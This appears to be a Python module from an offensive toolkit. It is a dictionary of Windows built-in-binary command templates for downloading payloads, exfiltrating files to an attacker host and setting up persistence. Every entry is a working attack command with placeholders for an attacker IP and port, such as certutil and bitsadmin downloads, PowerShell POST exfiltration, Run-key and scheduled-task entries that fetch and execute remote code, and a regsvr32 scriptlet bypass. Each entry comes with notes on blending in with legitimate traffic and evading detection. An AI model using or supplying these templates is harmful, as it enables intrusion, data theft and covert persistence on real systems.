# Windows LOLBAS command dictionary.

WINDOWS_COMMANDS = {

    # DOWNLOAD
    "download": [
        {
            "name":        "certutil (Base64 download)",
            "binary":      "certutil",
            "template":    'certutil -urlcache -split -f http://{ip}:{port}/{filename} %TEMP%\\{filename}',
            "stealth_note": "certutil is a signed Microsoft binary (LOLBin). "
                            "Its network requests blend in with legitimate certificate operations.",
            "requires":    "Attacker must host file via HTTP (e.g. python -m http.server {port})",
        },
        {
            "name":        "bitsadmin (Background Transfer)",
            "binary":      "bitsadmin",
            "template":    'bitsadmin /transfer job1 http://{ip}:{port}/{filename} %TEMP%\\{filename}',
            "stealth_note": "BITS is a legitimate Windows service used for Windows Update. "
                            "Traffic looks like routine update activity.",
            "requires":    "HTTP server on attacker side.",
        },
        {
            "name":        "PowerShell WebClient",
            "binary":      "powershell",
            "template":    "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{ip}:{port}/{filename}','$env:TEMP\\{filename}')\"",
            "stealth_note": "Inline PowerShell avoids writing a .ps1 script to disk. "
                            "Net.WebClient is commonly used by legitimate admin tools.",
            "requires":    "PowerShell execution policy may restrict this. Use -ep bypass if needed.",
        },
        {
            "name":        "curl (Windows 10+)",
            "binary":      "curl",
            "template":    'curl -o %TEMP%\\{filename} http://{ip}:{port}/{filename}',
            "stealth_note": "Native curl.exe ships with Windows 10/11. "
                            "Security tools may not flag built-in curl traffic.",
            "requires":    "Windows 10 build 1803+ (curl shipped natively).",
        },
        {
            "name":        "xcopy (SMB Download)",
            "binary":      "xcopy",
            "template":    'xcopy \\\\{ip}\\share\\{filename} %TEMP%\\ /Y',
            "stealth_note": "SMB file copy mimics legitimate domain file-share traffic.",
            "requires":    "Attacker must run an SMB server (e.g. impacket-smbserver).",
        },
        {
            "name":        "regsvr32 (Scrobj COM download)",
            "binary":      "regsvr32",
            "template":    'regsvr32 /s /n /u /i:http://{ip}:{port}/{filename} scrobj.dll',
            "stealth_note": "regsvr32 is a signed Windows binary that can load COM objects "
                            "from remote URLs — a classic 'Squiblydoo' bypass technique.",
            "requires":    "Remote file must be a valid SCT (COM scriptlet) XML.",
        },
    ],

    # UPLOAD / DATA EXFILTRATION
    "upload": [
        {
            "name":        "PowerShell HTTP POST exfil",
            "binary":      "powershell",
            "template":    "powershell -c \"Invoke-WebRequest -Uri http://{ip}:{port}/upload -Method POST -InFile '$env:TEMP\\{filename}'\"",
            "stealth_note": "Outbound HTTP POST to a custom port. "
                            "Using Invoke-WebRequest keeps the payload in memory.",
            "requires":    "Attacker must run an HTTP server accepting POST (e.g. uploadserver pip pkg).",
        },
        {
            "name":        "certutil Base64 + HTTP PUT",
            "binary":      "certutil",
            "template":    'certutil -encode %TEMP%\\{filename} %TEMP%\\{filename}.b64 && curl -X PUT http://{ip}:{port}/{filename}.b64 --data-binary @%TEMP%\\{filename}.b64',
            "stealth_note": "Data is Base64-encoded before transmission, bypassing naive "
                            "content-inspection rules. certutil encode is rarely alerted on.",
            "requires":    "curl must be available (Win10+).",
        },
        {
            "name":        "BITS (upload via HTTP PUT)",
            "binary":      "bitsadmin",
            "template":    'bitsadmin /transfer exfiljob1 /upload http://{ip}:{port}/{filename} %TEMP%\\{filename}',
            "stealth_note": "BITS upload uses the same Windows Update service channel, "
                            "making exfil traffic blend with routine OS activity.",
            "requires":    "HTTP server must support PUT/upload endpoint.",
        },
        {
            "name":        "ftp (anonymous exfil)",
            "binary":      "ftp",
            "template":    'echo open {ip} {port}>ftpcmd.txt & echo anonymous>>ftpcmd.txt & echo pass>>ftpcmd.txt & echo put %TEMP%\\{filename}>>ftpcmd.txt & echo bye>>ftpcmd.txt & ftp -s:ftpcmd.txt & del ftpcmd.txt',
            "stealth_note": "Built-in ftp.exe used for anonymous upload. "
                            "FTP is often overlooked in firewall egress rules.",
            "requires":    "Attacker-side FTP server with anonymous write access.",
        },
        {
            "name":        "xcopy (SMB exfil)",
            "binary":      "xcopy",
            "template":    'xcopy %TEMP%\\{filename} \\\\{ip}\\share\\ /Y',
            "stealth_note": "SMB traffic mimics domain file-share usage, blending with "
                            "legitimate corporate file transfers.",
            "requires":    "Attacker must run an SMB server (e.g. impacket-smbserver share . -smb2support).",
        },
    ],

    # PERSISTENCE
    "persistence": [
        {
            "name":        "reg add (Run key)",
            "binary":      "reg",
            "template":    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "powershell -w hidden -c (New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/{filename}\') | IEX" /f',
            "stealth_note": "HKCU Run key does not require admin rights. "
                            "Using 'Updater' as the value name mimics Windows Update.",
            "requires":    "Attacker must serve the payload at the specified URL.",
        },
        {
            "name":        "schtasks (Scheduled Task)",
            "binary":      "schtasks",
            "template":    'schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/{filename}\')" /sc onlogon /ru SYSTEM /f',
            "stealth_note": "Task named 'WindowsUpdate' blends with legitimate tasks. "
                            "SYSTEM-level execution with no window (/w hidden).",
            "requires":    "Admin rights for SYSTEM-level task creation.",
        },
        {
            "name":        "wmic (startup entry)",
            "binary":      "wmic",
            "template":    'wmic startup call create "powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/{filename}\')", "Updater"',
            "stealth_note": "wmic is a signed Windows management binary rarely blocked. "
                            "Startup entries persist across reboots without touching the registry directly.",
            "requires":    "Admin rights may be required.",
        },
        {
            "name":        "mshta (HTA persistence via Run key)",
            "binary":      "mshta",
            "template":    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MSUpdate /t REG_SZ /d "mshta http://{ip}:{port}/{filename}" /f',
            "stealth_note": "mshta.exe is a signed Microsoft HTML Application host. "
                            "It can fetch and execute remote HTA files, bypassing script-block logging.",
            "requires":    "Remote file must be a valid .hta HTML Application.",
        },
    ],
}
